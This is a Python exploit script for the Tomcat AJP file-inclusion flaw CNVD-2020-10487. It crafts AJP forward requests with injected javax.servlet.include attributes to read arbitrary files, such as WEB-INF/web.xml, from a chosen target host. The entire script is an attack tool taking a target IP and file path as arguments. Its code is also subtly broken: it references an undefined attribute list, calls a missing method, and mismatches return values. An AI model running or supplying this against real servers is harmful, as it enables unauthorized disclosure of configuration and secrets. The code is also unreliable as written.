#!/usr/bin/env python
# CNVD-2020-10487 Tomcat-AJP LFI

import struct
import socket
import argparse

# 工具函数
def pack_string(s):
    """将字符串打包为AJP协议格式的二进制数据"""
    if s is None:
        return struct.pack(">h", -1)  # 表示null字符串
    length = len(s)
    return struct.pack(">H%dsb" % length, length, s.encode('utf8'), 0)

def unpack(stream, fmt):
    """从流中解包数据"""
    size = struct.calcsize(fmt)
    buf = stream.read(size)
    return struct.unpack(fmt, buf)

def unpack_string(stream):
    """从流中解包AJP字符串"""
    size, = unpack(stream, ">h")
    if size == -1:  # null字符串
        return None
    result, = unpack(stream, f"{size}s")
    stream.read(1)  # 读取末尾的\0
    return result


class NotFoundException(Exception):
    pass


class AjpBodyRequest:
    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)
    MAX_REQUEST_LENGTH = 8186

    def __init__(self, data_stream, data_len, data_direction=None):
        self.data_stream = data_stream
        self.data_len = data_len
        self.data_direction = data_direction

    def serialize(self):
        """序列化请求体数据"""
        data = self.data_stream.read(AjpBodyRequest.MAX_REQUEST_LENGTH)
        if not data:
            return struct.pack(">bbH", 0x12, 0x34, 0x00)
        payload = struct.pack(">H", len(data)) + data
        header = struct.pack(">bbH", 0x12, 0x34, len(payload)) if self.data_direction == AjpBodyRequest.SERVER_TO_CONTAINER else struct.pack(">bbH", 0x41, 0x42, len(payload))
        return header + payload

    def send_and_receive(self, socket, stream):
        """发送并接收AJP响应"""
        while True:
            socket.send(self.serialize())
            response = AjpResponse.receive(stream)
            if response.prefix_code in [AjpResponse.SEND_HEADERS, AjpResponse.GET_BODY_CHUNK]:
                break


class AjpForwardRequest:
    METHODS = {'GET': 2, 'POST': 4, 'HEAD': 3, 'OPTIONS': 1}
    SERVER_TO_CONTAINER, CONTAINER_TO_SERVER = range(2)

    def __init__(self, data_direction=None):
        self.prefix_code = 0x02
        self.method = None
        self.protocol = None
        self.req_uri = None
        self.remote_addr = None
        self.server_name = None
        self.server_port = None
        self.request_headers = {}
        self.attributes = []
        self.data_direction = data_direction

    def pack_headers(self):
        """打包请求头"""
        result = struct.pack(">h", len(self.request_headers))
        for header_name, header_value in self.request_headers.items():
            result += pack_string(header_name) + pack_string(header_value)
        return result

    def pack_attributes(self):
        """打包请求属性"""
        result = b""
        for attr in self.attributes:
            result += struct.pack("b", AjpForwardRequest.ATTRIBUTES.index(attr['name']) + 1)
            if attr['name'] == "req_attribute":
                result += pack_string(attr['value'][0]) + pack_string(attr['value'][1])
            else:
                result += pack_string(attr['value'])
        result += struct.pack("B", 0xFF)
        return result

    def serialize(self):
        """序列化请求数据"""
        result = struct.pack("bb", self.prefix_code, self.method)
        result += pack_string(self.protocol) + pack_string(self.req_uri)
        result += pack_string(self.remote_addr) + pack_string(self.server_name)
        result += struct.pack(">h", self.server_port)
        result += self.pack_headers() + self.pack_attributes()
        header = struct.pack(">bbh", 0x12, 0x34, len(result)) if self.data_direction == AjpForwardRequest.SERVER_TO_CONTAINER else struct.pack(">bbh", 0x41, 0x42, len(result))
        return header + result


class AjpResponse:
    SEND_HEADERS, SEND_BODY_CHUNK, END_RESPONSE, GET_BODY_CHUNK = 4, 3, 5, 6

    def __init__(self):
        self.response_headers = {}

    def parse(self, stream):
        """解析AJP响应"""
        self.magic, self.data_length, self.prefix_code = unpack(stream, ">HHb")
        if self.prefix_code == AjpResponse.SEND_HEADERS:
            self.parse_send_headers(stream)
        elif self.prefix_code == AjpResponse.SEND_BODY_CHUNK:
            self.data = stream.read(self.data_length + 1)
        elif self.prefix_code == AjpResponse.END_RESPONSE:
            self.reuse, = unpack(stream, "b")

    def parse_send_headers(self, stream):
        """解析AJP响应头"""
        self.http_status_code, = unpack(stream, ">H")
        self.http_status_msg = unpack_string(stream)
        self.num_headers, = unpack(stream, ">H")
        for _ in range(self.num_headers):
            header_name = unpack_string(stream)
            header_value = unpack_string(stream)
            self.response_headers[header_name] = header_value

    @staticmethod
    def receive(stream):
        """接收AJP响应"""
        response = AjpResponse()
        response.parse(stream)
        return response


class Tomcat:
    def __init__(self, target_host, target_port):
        self.target_host = target_host
        self.target_port = target_port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.connect((target_host, target_port))
        self.stream = self.socket.makefile("rb", buffering=0)

    def perform_request(self, req_uri, headers=None, method='GET', attributes=None):
        """执行AJP请求"""
        headers = headers or {}
        attributes = attributes or []
        forward_request = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)
        forward_request.method = AjpForwardRequest.METHODS.get(method, 2)
        forward_request.req_uri = req_uri
        forward_request.remote_addr = self.target_host
        forward_request.server_name = self.target_host
        forward_request.server_port = 80
        forward_request.request_headers.update(headers)
        forward_request.attributes.extend(attributes)
        responses = forward_request.send_and_receive(self.socket, self.stream)
        return responses[0] if responses else None


def main():
    parser = argparse.ArgumentParser(description="Tomcat AJP LFI Exploit")
    parser.add_argument("target", type=str, help="Target IP or Hostname")
    parser.add_argument("-p", "--port", type=int, default=8009, help="AJP port (default: 8009)")
    parser.add_argument("-f", "--file", type=str, default='WEB-INF/web.xml', help="File path to read (default: WEB-INF/web.xml)")
    args = parser.parse_args()

    tomcat = Tomcat(args.target, args.port)
    _, data = tomcat.perform_request(
        '/test',
        attributes=[
            {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']},
            {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', args.file]},
            {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']}
        ]
    )
    print('----------------------------')
    print("".join([d.data for d in data]))


if __name__ == "__main__":
    main()
